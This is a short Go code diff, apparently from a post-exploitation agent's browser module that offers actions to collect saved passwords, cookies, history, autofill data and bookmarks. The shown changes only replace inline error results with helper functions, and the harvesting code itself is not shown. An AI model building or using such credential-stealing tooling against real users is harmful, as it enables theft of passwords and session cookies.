@@ -77,11 +77,7 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 	case "bookmarks":
 		return browserBookmarks(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks", args.Action)
 	}
 }
 
@@ -281,11 +277,7 @@ func findProfiles(userDataDir string) []string {
 func browserPasswords(args browserArgs) structs.CommandResult {
 	paths := browserPaths(args.Browser)
 	if paths == nil {
-		return structs.CommandResult{
-			Output:    "Could not determine LOCALAPPDATA path",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Could not determine LOCALAPPDATA path")
 	}
 
 	var allCreds []browserCred
@@ -501,11 +493,7 @@ func cookieDBPath(profileDir string) string {
 func browserCookies(args browserArgs) structs.CommandResult {
 	paths := browserPaths(args.Browser)
 	if paths == nil {
-		return structs.CommandResult{
-			Output:    "Could not determine LOCALAPPDATA path",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Could not determine LOCALAPPDATA path")
 	}
 
 	var allCookies []browserCookie
